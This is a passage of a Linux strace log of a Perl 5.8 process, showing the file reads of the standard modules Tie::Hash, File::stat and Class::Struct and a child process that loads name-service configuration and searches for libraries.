$_[0][1]->(\'del\', $_[0][0], $_[1]); # Call the report writer\n      delete $_[0][0]->{$_[1]};\t\t  #  $_[0]->SUPER::DELETE($_[1])\n    }\n\n\n    package main;\n\n    tie %new_hash, \'NewHash\';\n    tie %new_std_hash, \'NewStdHash\';\n    tie %new_extra_hash, \'NewExtraHash\',\n\tsub {warn \"Doing \\U$_[1]\\E of $_[2].\\n\"};\n\n=head1 DESCRIPTION\n\nThis module provides some skeletal methods for hash-tying classes. See\nL<perltie> for a list of the functions required in order to tie a hash\nto a package. The basic B<Tie::Hash> package provides a C<new> method, as well\nas methods C<TIEHASH>, C<EXISTS> and C<CLEAR>. The B<Tie::StdHash> and\nB<Tie::ExtraHash> packages\nprovide most methods for hashes described in L<perltie> (the exceptions\nare C<UNTIE> and C<DESTROY>).  They cause tied hashes to behave exactly like standard hashes,\nand allow for selective overwriting of methods.  B<Tie::Hash> grandfathers the\nC<new> method: it is used if C<TIEHASH> is not defined\nin the case a class forgets to include a C<TIEHASH> method.\n\nFor developers wishing to write their own tied hashes, the required methods\nare briefly defined below. See the L<perltie> section for more detailed\ndescriptive, as well as example code:\n\n=over 4\n\n=item TIEHASH classname, LIST\n\nThe method invoked by the command C<tie %hash, classname>. Associates a new\nhash instance with the specified class. C<LIST> would represent additional\narguments (along the lines of L<AnyDBM_File> and compatriots) needed to\ncomplete the association.\n\n=item STORE this, key, value\n\nStore datum I<value> into I<key> for the tied hash I<this>.\n\n=item FETCH this, key\n\nRetrieve the datum in I<key> for the tied hash I<this>.\n\n=item FIRSTKEY this\n\nReturn the first key in the hash.\n\n=item NEXTKEY this, lastkey\n\nReturn the next key in the hash.\n\n=item EXISTS this, key\n\nVerify that I<key> exists with the tied hash I<this>.\n\nThe B<Tie::Hash> implementation is a stub that simply croaks.\n\n=item DELETE this, key\n\nDelete the key I<key> from the tied hash I<this>.\n\n=item CLEAR this\n\nClear all values from the tied hash I<this>.\n\n=item SCALAR this\n\nReturns what evaluating the hash in scalar context yields.\n\nB<Tie::Hash> does not implement this method (but B<Tie::StdHash>\nand B<Tie::ExtraHash> do).\n\n=back\n\n=head1 Inheriting from B<Tie::StdHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<tied(%tiedhash)>.  Thus overwritten\nC<TIEHASH> method should return a hash reference, and the remaining methods\nshould operate on the hash referenced by the first argument:\n\n  package ReportHash;\n  our @ISA = \'Tie::StdHash\';\n\n  sub TIEHASH  {\n    my $storage = bless {}, shift;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0]{$_[1]} = $_[2]\n  }\n\n\n=head1 Inheriting from B<Tie::ExtraHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<(tied(%tiedhash))-E<gt>[0]>.  Thus overwritten\nC<TIEHASH> method should return an array reference with the first\nelement being a hash refer", 4096) = 4096
10195 07:31:50.996768 read(8, "ence, and the remaining methods should operate on the\nhash C<< %{ $_[0]->[0] } >>:\n\n  package ReportHash;\n  our @ISA = \'Tie::ExtraHash\';\n\n  sub TIEHASH  {\n    my $class = shift;\n    my $storage = bless [{}, @_], $class;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage;\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0][0]{$_[1]} = $_[2]\n  }\n\nThe default C<TIEHASH> method stores \"extra\" arguments to tie() starting\nfrom offset 1 in the array referenced by C<tied(%tiedhash)>; this is the\nsame storage algorithm as in TIEHASH subroutine above.  Hence, a typical\npackage inheriting from B<Tie::ExtraHash> does not need to overwrite this\nmethod.\n\n=head1 C<SCALAR>, C<UNTIE> and C<DESTROY>\n\nThe methods C<UNTIE> and C<DESTROY> are not defined in B<Tie::Hash>,\nB<Tie::StdHash>, or B<Tie::ExtraHash>.  Tied hashes do not require\npresence of these methods, but if defined, the methods will be called in\nproper time, see L<perltie>.\n\nC<SCALAR> is only defined in B<Tie::StdHash> and B<Tie::ExtraHash>.\n\nIf needed, these methods should be defined by the package inheriting from\nB<Tie::Hash>, B<Tie::StdHash>, or B<Tie::ExtraHash>. See L<pertie/\"SCALAR\">\nto find out what happens when C<SCALAR> does not exist.\n\n=head1 MORE INFORMATION\n\nThe packages relating to various DBM-related implementations (F<DB_File>,\nF<NDBM_File>, etc.) show examples of general tied hashes, as does the\nL<Config> module. While these do not utilize B<Tie::Hash>, they serve as\ngood working examples.\n\n=cut\n\nuse Carp;\nuse warnings::register;\n\nsub new {\n    my $pkg = shift;\n    $pkg->TIEHASH(@_);\n}\n\n# Grandfather \"new\"\n\nsub TIEHASH {\n    my $pkg = shift;\n    if (defined &{\"${pkg}::new\"}) {\n\twarnings::warnif(\"WARNING: calling ${pkg}->new since ${pkg}->TIEHASH is missing\");\n\t$pkg->new(@_);\n    }\n    else {\n\tcroak \"$pkg doesn\'t define a TIEHASH method\";\n    }\n}\n\nsub EXISTS {\n    my $pkg = ref $_[0];\n    croak \"$pkg doesn\'t define an EXISTS method\";\n}\n\nsub CLEAR {\n    my $self = shift;\n    my $key = $self->FIRSTKEY(@_);\n    my @keys;\n\n    while (defined $key) {\n\tpush @keys, $key;\n\t$key = $self->NEXTKEY(@_, $key);\n    }\n    foreach $key (@keys) {\n\t$self->DELETE(@_, $key);\n    }\n}\n\n# The Tie::StdHash package implements standard perl hash behaviour.\n# It exists to act as a base class for classes which only wish to\n# alter some parts of their behaviour.\n\npackage Tie::StdHash;\n# @ISA = qw(Tie::Hash);\t\t# would inherit new() only\n\nsub TIEHASH  { bless {}, $_[0] }\nsub STORE    { $_[0]->{$_[1]} = $_[2] }\nsub FETCH    { $_[0]->{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0]}; each %{$_[0]} }\nsub NEXTKEY  { each %{$_[0]} }\nsub EXISTS   { exists $_[0]->{$_[1]} }\nsub DELETE   { delete $_[0]->{$_[1]} }\nsub CLEAR    { %{$_[0]} = () }\nsub SCALAR   { scalar %{$_[0]} }\n\npackage Tie::ExtraHash;\n\nsub TIEHASH  { my $p = shift; bless [{}, @_], $p }\nsub STORE    { $_[0][0]{$_[1]} = $_[2] }\nsub FETCH    { $_[0][0]{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0][0]}; each %{$_[0][0]} }\nsub NEXTKEY  { each %{$_[0][0]} }\nsub EXISTS   { exists $_[0][0]->{$_[1]} }\nsub DELETE   { delete $_[0][0]->{$_[1]} }\nsub CLEAR    { %{$_[0][0]} = () }\nsub SCALAR   { scalar %{$_[0][0]} }\n\n1;\n", 4096) = 3208
10195 07:31:50.997339 read(8, "", 4096) = 0
10195 07:31:50.997355 close(8)          = 0
10195 07:31:50.997401 stat64("/etc/perl/File/stat.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.997419 stat64("/etc/perl/File/stat.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.997433 stat64("/usr/local/lib/perl/5.8.8/File/stat.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.997446 stat64("/usr/local/lib/perl/5.8.8/File/stat.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.997461 stat64("/usr/local/share/perl/5.8.8/File/stat.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.997474 stat64("/usr/local/share/perl/5.8.8/File/stat.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.997489 stat64("/usr/lib/perl5/File/stat.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.997501 stat64("/usr/lib/perl5/File/stat.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.997514 stat64("/usr/share/perl5/File/stat.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.997531 stat64("/usr/share/perl5/File/stat.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.997545 stat64("/usr/lib/perl/5.8/File/stat.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.997558 stat64("/usr/lib/perl/5.8/File/stat.pm", 0xbfc56c0c) = -1 ENOENT (No such file or directory)
10195 07:31:50.997572 stat64("/usr/share/perl/5.8/File/stat.pmc", 0xbfc56cfc) = -1 ENOENT (No such file or directory)
10195 07:31:50.997585 stat64("/usr/share/perl/5.8/File/stat.pm", {st_mode=S_IFREG|0644, st_size=3372, ...}) = 0
10195 07:31:50.997607 open("/usr/share/perl/5.8/File/stat.pm", O_RDONLY|O_LARGEFILE) = 8
10195 07:31:50.997622 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc56a18) = -1 ENOTTY (Inappropriate ioctl for device)
10195 07:31:50.997634 _llseek(8, 0, [0], SEEK_CUR) = 0
10195 07:31:50.997651 read(8, "package File::stat;\nuse 5.006;\n\nuse strict;\nuse warnings;\n\nour(@EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n\nour $VERSION = \'1.00\';\n\nBEGIN { \n    use Exporter   ();\n    @EXPORT      = qw(stat lstat);\n    @EXPORT_OK   = qw( $st_dev\t   $st_ino    $st_mode \n\t\t       $st_nlink   $st_uid    $st_gid \n\t\t       $st_rdev    $st_size \n\t\t       $st_atime   $st_mtime  $st_ctime \n\t\t       $st_blksize $st_blocks\n\t\t    );\n    %EXPORT_TAGS = ( FIELDS => [ @EXPORT_OK, @EXPORT ] );\n}\nuse vars @EXPORT_OK;\n\n# Class::Struct forbids use of @ISA\nsub import { goto &Exporter::import }\n\nuse Class::Struct qw(struct);\nstruct \'File::stat\' => [\n     map { $_ => \'$\' } qw{\n\t dev ino mode nlink uid gid rdev size\n\t atime mtime ctime blksize blocks\n     }\n];\n\nsub populate (@) {\n    return unless @_;\n    my $stob = new();\n    @$stob = (\n\t$st_dev, $st_ino, $st_mode, $st_nlink, $st_uid, $st_gid, $st_rdev,\n        $st_size, $st_atime, $st_mtime, $st_ctime, $st_blksize, $st_blocks ) \n\t    = @_;\n    return $stob;\n} \n\nsub lstat ($)  { populate(CORE::lstat(shift)) }\n\nsub stat ($) {\n    my $arg = shift;\n    my $st = populate(CORE::stat $arg);\n    return $st if $st;\n\tmy $fh;\n    {\n\t\tlocal $!;\n\t\tno strict \'refs\';\n\t\trequire Symbol;\n\t\t$fh = \\*{ Symbol::qualify( $arg, caller() )};\n\t\treturn unless defined fileno $fh;\n\t}\n    return populate(CORE::stat $fh);\n}\n\n1;\n__END__\n\n=head1 NAME\n\nFile::stat - by-name interface to Perl\'s built-in stat() functions\n\n=head1 SYNOPSIS\n\n use File::stat;\n $st = stat($file) or die \"No $file: $!\";\n if ( ($st->mode & 0111) && $st->nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n use File::stat qw(:FIELDS);\n stat($file) or die \"No $file: $!\";\n if ( ($st_mode & 0111) && $st_nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n=head1 DESCRIPTION\n\nThis module\'s default exports override the core stat() \nand lstat() functions, replacing them with versions that return \n\"File::stat\" objects.  This object has methods that\nreturn the similarly named structure field name from the\nstat(2) function; namely,\ndev,\nino,\nmode,\nnlink,\nuid,\ngid,\nrdev,\nsize,\natime,\nmtime,\nctime,\nblksize,\nand\nblocks.  \n\nYou may also import all the structure fields directly into your namespace\nas regular variables using the :FIELDS import tag.  (Note that this still\noverrides your stat() and lstat() functions.)  Access these fields as\nvariables named with a preceding C<st_> in front their method names.\nThus, C<$stat_obj-E<gt>dev()> corresponds to $st_dev if you import\nthe fields.\n\nTo access this functionality without the core overrides,\npass the C<use> an empty import list, and then access\nfunction functions with their full qualified names.\nOn the other hand, the built-ins are still available\nvia the C<CORE::> pseudo-package.\n\n=head1 BUGS\n\nAs of Perl 5.8.0 after using this module you cannot use the implicit\nC<$_> or the special filehandle C<_> with stat() or lstat(), trying\nto do so leads into strange errors.  The workaround is for C<$_> to\nbe explicit\n\n    my $stat_obj = stat $_;\n\nand for C<_> to explicitly populate the object using the unexported\nand undocumented populate() function with CORE::stat():\n\n    my $stat_obj = File::stat::populate(CORE::stat(_));\n\n=head1 NOTE\n\nWhile this class is currently implemented using the Class::Struct\nmodule to build a struct-like class, you shouldn\'t rely upon this.\n\n=head1 AUTHOR\n\nTom Christiansen\n", 4096) = 3372
10195 07:31:50.998081 stat64("/etc/perl/Class/Struct.pmc", 0xbfc5684c) = -1 ENOENT (No such file or directory)
10195 07:31:50.998100 stat64("/etc/perl/Class/Struct.pm", 0xbfc5675c) = -1 ENOENT (No such file or directory)
10195 07:31:50.998115 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pmc", 0xbfc5684c) = -1 ENOENT (No such file or directory)
10195 07:31:50.998128 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pm", 0xbfc5675c) = -1 ENOENT (No such file or directory)
10195 07:31:50.998143 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pmc", 0xbfc5684c) = -1 ENOENT (No such file or directory)
10195 07:31:50.998156 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pm", 0xbfc5675c) = -1 ENOENT (No such file or directory)
10195 07:31:50.998171 stat64("/usr/lib/perl5/Class/Struct.pmc", 0xbfc5684c) = -1 ENOENT (No such file or directory)
10195 07:31:50.998183 stat64("/usr/lib/perl5/Class/Struct.pm", 0xbfc5675c) = -1 ENOENT (No such file or directory)
10195 07:31:50.998196 stat64("/usr/share/perl5/Class/Struct.pmc", 0xbfc5684c) = -1 ENOENT (No such file or directory)
10195 07:31:50.998209 stat64("/usr/share/perl5/Class/Struct.pm", 0xbfc5675c) = -1 ENOENT (No such file or directory)
10195 07:31:50.998223 stat64("/usr/lib/perl/5.8/Class/Struct.pmc", 0xbfc5684c) = -1 ENOENT (No such file or directory)
10195 07:31:50.998236 stat64("/usr/lib/perl/5.8/Class/Struct.pm", 0xbfc5675c) = -1 ENOENT (No such file or directory)
10195 07:31:50.998250 stat64("/usr/share/perl/5.8/Class/Struct.pmc", 0xbfc5684c) = -1 ENOENT (No such file or directory)
10195 07:31:50.998263 stat64("/usr/share/perl/5.8/Class/Struct.pm", {st_mode=S_IFREG|0644, st_size=20512, ...}) = 0
10195 07:31:50.998285 open("/usr/share/perl/5.8/Class/Struct.pm", O_RDONLY|O_LARGEFILE) = 10
10195 07:31:50.998300 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc56568) = -1 ENOTTY (Inappropriate ioctl for device)
10195 07:31:50.998312 _llseek(10, 0, [0], SEEK_CUR) = 0
10195 07:31:50.998331 read(10, "package Class::Struct;\n\n## See POD after __END__\n\nuse 5.006_001;\n\nuse strict;\nuse warnings::register;\nour(@ISA, @EXPORT, $VERSION);\n\nuse Carp;\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(struct);\n\n$VERSION = \'0.63\';\n\n## Tested on 5.002 and 5.003 without class membership tests:\nmy $CHECK_CLASS_MEMBERSHIP = ($] >= 5.003_95);\n\nmy $print = 0;\nsub printem {\n    if (@_) { $print = shift }\n    else    { $print++ }\n}\n\n{\n    package Class::Struct::Tie_ISA;\n\n    sub TIEARRAY {\n        my $class = shift;\n        return bless [], $class;\n    }\n\n    sub STORE {\n        my ($self, $index, $value) = @_;\n        Class::Struct::_subclass_error();\n    }\n\n    sub FETCH {\n        my ($self, $index) = @_;\n        $self->[$index];\n    }\n\n    sub FETCHSIZE {\n        my $self = shift;\n        return scalar(@$self);\n    }\n\n    sub DESTROY { }\n}\n\nsub import {\n    my $self = shift;\n\n    if ( @_ == 0 ) {\n      $self->export_to_level( 1, $self, @EXPORT );\n    } elsif ( @_ == 1 ) {\n\t# This is admittedly a little bit silly:\n\t# do we ever export anything else than \'struct\'...?\n      $self->export_to_level( 1, $self, @_ );\n    } else {\n      goto &struct;\n    }\n}\n\nsub struct {\n\n    # Determine parameter list structure, one of:\n    #   struct( class => [ element-list ])\n    #   struct( class => { element-list })\n    #   struct( element-list )\n    # Latter form assumes current package name as struct name.\n\n    my ($class, @decls);\n    my $base_type = ref $_[1];\n    if ( $base_type eq \'HASH\' ) {\n        $class = shift;\n        @decls = %{shift()};\n        _usage_error() if @_;\n    }\n    elsif ( $base_type eq \'ARRAY\' ) {\n        $class = shift;\n        @decls = @{shift()};\n        _usage_error() if @_;\n    }\n    else {\n        $base_type = \'ARRAY\';\n        $class = (caller())[0];\n        @decls = @_;\n    }\n\n    _usage_error() if @decls % 2 == 1;\n\n    # Ensure we are not, and will not be, a subclass.\n\n    my $isa = do {\n        no strict \'refs\';\n        \\@{$class . \'::ISA\'};\n    };\n    _subclass_error() if @$isa;\n    tie @$isa, \'Class::Struct::Tie_ISA\';\n\n    # Create constructor.\n\n    croak \"function \'new\' already defined in package $class\"\n        if do { no strict \'refs\'; defined &{$class . \"::new\"} };\n\n    my @methods = ();\n    my %refs = ();\n    my %arrays = ();\n    my %hashes = ();\n    my %classes = ();\n    my $got_class = 0;\n    my $out = \'\';\n\n    $out = \"{\\n  package $class;\\n  use Carp;\\n  sub new {\\n\";\n    $out .= \"    my (\\$class, \\%init) = \\@_;\\n\";\n    $out .= \"    \\$class = __PACKAGE__ unless \\@_;\\n\";\n\n    my $cnt = 0;\n    my $idx = 0;\n    my( $cmt, $name, $type, $elem );\n\n    if( $base_type eq \'HASH\' ){\n        $out .= \"    my(\\$r) = {};\\n\";\n        $cmt = \'\';\n    }\n    elsif( $base_type eq \'ARRAY\' ){\n        $out .= \"    my(\\$r) = [];\\n\";\n    }\n    while( $idx < @decls ){\n        $name = $decls[$idx];\n        $type = $decls[$idx+1];\n        push( @methods, $name );\n        if( $base_type eq \'HASH\' ){\n            $elem = \"{\'${class}::$name\'}\";\n        }\n        elsif( $base_type eq \'ARRAY\' ){\n            $elem = \"[$cnt]\";\n            ++$cnt;\n            $cmt = \" # $name\";\n        }\n        if( $type =~ /^\\*(.)/ ){\n            $refs{$name}++;\n            $type = $1;\n        }\n        my $init = \"defined(\\$init{\'$name\'}) ? \\$init{\'$name\'} :\";\n        if( $type eq \'@\' ){\n            $out .= \"    croak \'Initializer for $name must be array reference\'\\n\"; \n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'ARRAY\';\\n\";\n            $out .= \"    \\$r->$elem = $init [];$cmt\\n\"; \n            $arrays{$name}++;\n        }\n        elsif( $type eq \'%\' ){\n            $out .= \"    croak \'Initializer for $name must be hash reference\'\\n\";\n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'HASH\';\\n\";\n            $out .= \"    \\$r->$elem = $init {};$cmt\\n\";\n            $hashes{$name}++;\n        }\n        elsif ( $type eq \'$\') {\n            $out .= \"    \\$r->$elem = $init undef;$cmt\\n\";\n        }\n        elsif( $type =~ /^\\w+(?:::\\w+)*$/ ){\n            $out .= \"    if (defined(\\$init{\'$name\'}))", 4096) = 4096
10195 07:31:50.998752 brk(0x82de000)    = 0x82de000
10195 07:31:50.999115 read(10, " {\\n\";\n           $out .= \"       if (ref \\$init{\'$name\'} eq \'HASH\')\\n\";\n            $out .= \"            { \\$r->$elem = $type->new(\\%{\\$init{\'$name\'}}) } $cmt\\n\";\n           $out .= \"       elsif (UNIVERSAL::isa(\\$init{\'$name\'}, \'$type\'))\\n\";\n            $out .= \"            { \\$r->$elem = \\$init{\'$name\'} } $cmt\\n\";\n            $out .= \"       else { croak \'Initializer for $name must be hash or $type reference\' }\\n\";\n            $out .= \"    }\\n\";\n            $classes{$name} = $type;\n            $got_class = 1;\n        }\n        else{\n            croak \"\'$type\' is not a valid struct element type\";\n        }\n        $idx += 2;\n    }\n    $out .= \"    bless \\$r, \\$class;\\n  }\\n\";\n\n    # Create accessor methods.\n\n    my( $pre, $pst, $sel );\n    $cnt = 0;\n    foreach $name (@methods){\n        if ( do { no strict \'refs\'; defined &{$class . \"::$name\"} } ) {\n            warnings::warnif(\"function \'$name\' already defined, overrides struct accessor method\");\n        }\n        else {\n            $pre = $pst = $cmt = $sel = \'\';\n            if( defined $refs{$name} ){\n                $pre = \"\\\\(\";\n                $pst = \")\";\n                $cmt = \" # returns ref\";\n            }\n            $out .= \"  sub $name {$cmt\\n    my \\$r = shift;\\n\";\n            if( $base_type eq \'ARRAY\' ){\n                $elem = \"[$cnt]\";\n                ++$cnt;\n            }\n            elsif( $base_type eq \'HASH\' ){\n                $elem = \"{\'${class}::$name\'}\";\n            }\n            if( defined $arrays{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\"; \n                $out .= \"    if (ref(\\$i) eq \'ARRAY\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->[\\$i]\";\n            }\n            elsif( defined $hashes{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\";\n                $out .= \"    if (ref(\\$i) eq \'HASH\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->{\\$i}\";\n            }\n            elsif( defined $classes{$name} ){\n                if ( $CHECK_CLASS_MEMBERSHIP ) {\n                    $out .= \"    croak \'$name argument is wrong class\' if \\@_ && ! UNIVERSAL::isa(\\$_[0], \'$classes{$name}\');\\n\";\n                }\n            }\n            $out .= \"    croak \'Too many args to $name\' if \\@_ > 1;\\n\";\n            $out .= \"    \\@_ ? ($pre\\$r->$elem$sel = shift$pst) : $pre\\$r->$elem$sel$pst;\\n\";\n            $out .= \"  }\\n\";\n        }\n    }\n    $out .= \"}\\n1;\\n\";\n\n    print $out if $print;\n    my $result = eval $out;\n    carp $@ if $@;\n}\n\nsub _usage_error {\n    confess \"struct usage error\";\n}\n\nsub _subclass_error {\n    croak \'struct class cannot be a subclass (@ISA not allowed)\';\n}\n\n1; # for require\n\n\n__END__\n\n=head1 NAME\n\nClass::Struct - declare struct-like datatypes as Perl classes\n\n=head1 SYNOPSIS\n\n    use Class::Struct;\n            # declare struct, based on array:\n    struct( CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ]);\n            # declare struct, based on hash:\n    struct( CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... });\n\n    package CLASS_NAME;\n    use Class::Struct;\n            # declare struct, based on array, implicit class name:\n    struct( ELEMENT_NAME => ELEMENT_TYPE, ... );\n\n    # Declare struct at compile time\n    use Class::Struct CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ];\n    use Class::Struct CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... };\n\n    # declare struct at compile time, based on array, implicit class name:\n    package CLASS_NAME;\n    use Class::Struct ELEMENT_NAME => ELEMENT_TYPE, ... ;\n\n    package Myobj;\n    use Class::Struct;\n            # declare struct with four types of elements:\n    struct( s => \'$\', a => \'@\', h => \'%\', c => \'My_Other_Class\' );\n\n    $obj = new Myobj;               # constructor\n\n                                    # scalar type accessor:\n    $element_value = $obj->s;           # element value\n    $obj->s(\'new value\');               # assign to element\n\n                             ", 4096) = 4096
10195 07:31:50.999729 _llseek(10, 6916, [6916], SEEK_SET) = 0
10195 07:31:50.999746 _llseek(10, 0, [6916], SEEK_CUR) = 0
10195 07:31:50.999757 close(10)         = 0
10195 07:31:50.999951 _llseek(8, 1334, [1334], SEEK_SET) = 0
10195 07:31:50.999968 _llseek(8, 0, [1334], SEEK_CUR) = 0
10195 07:31:50.999979 close(8)          = 0
10195 07:31:51.001304 brk(0x82ff000)    = 0x82ff000
10195 07:31:51.001451 _llseek(6, 2689, [2689], SEEK_SET) = 0
10195 07:31:51.001467 _llseek(6, 0, [2689], SEEK_CUR) = 0
10195 07:31:51.001478 close(6)          = 0
10195 07:31:51.001644 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d5c908) = 10196
10196 07:31:51.014119 getppid()         = 10195
10196 07:31:51.014652 open("/etc/nsswitch.conf", O_RDONLY) = 6
10196 07:31:51.014677 fstat64(6, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
10196 07:31:51.014696 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f22000
10196 07:31:51.014710 read(6, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
10196 07:31:51.014765 read(6, "", 4096) = 0
10196 07:31:51.014775 close(6)          = 0
10196 07:31:51.014785 munmap(0xb7f22000, 4096) = 0
10196 07:31:51.014811 open("/etc/ld.so.cache", O_RDONLY) = 6
10196 07:31:51.014837 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
10196 07:31:51.014881 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7d29000
10196 07:31:51.014893 close(6)          = 0
10196 07:31:51.014921 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10196 07:31:51.014940 open("/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.014954 stat64("/lib/tls/i686/sse2/cmov", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.014968 open("/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.014981 stat64("/lib/tls/i686/sse2", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.014993 open("/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.015005 stat64("/lib/tls/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
10196 07:31:51.015023 open("/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.015035 stat64("/lib/tls/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
10196 07:31:51.015052 open("/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.015064 stat64("/lib/tls/sse2/cmov", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.015075 open("/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.015088 stat64("/lib/tls/sse2", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.015099 open("/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.015111 stat64("/lib/tls/cmov", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.015121 open("/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.015133 stat64("/lib/tls", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
10196 07:31:51.015149 open("/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.015162 stat64("/lib/i686/sse2/cmov", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.015173 open("/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.015184 stat64("/lib/i686/sse2", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.015195 open("/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.015207 stat64("/lib/i686/cmov", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.015218 open("/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.015229 stat64("/lib/i686", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.015240 open("/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.015251 stat64("/lib/sse2/cmov", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.015262 open("/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.015274 stat64("/lib/sse2", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.015284 open("/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.015296 stat64("/lib/cmov", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.015310 open("/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.015332 stat64("/lib", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
10196 07:31:51.015379 open("/usr/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10196 07:31:51.015393 stat64("/usr/lib/tls/i686/sse2/cmov", 0xbfc570ec) = -1 ENOENT (No such file or directory)
10196 07:31:51.015437 open("/usr/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
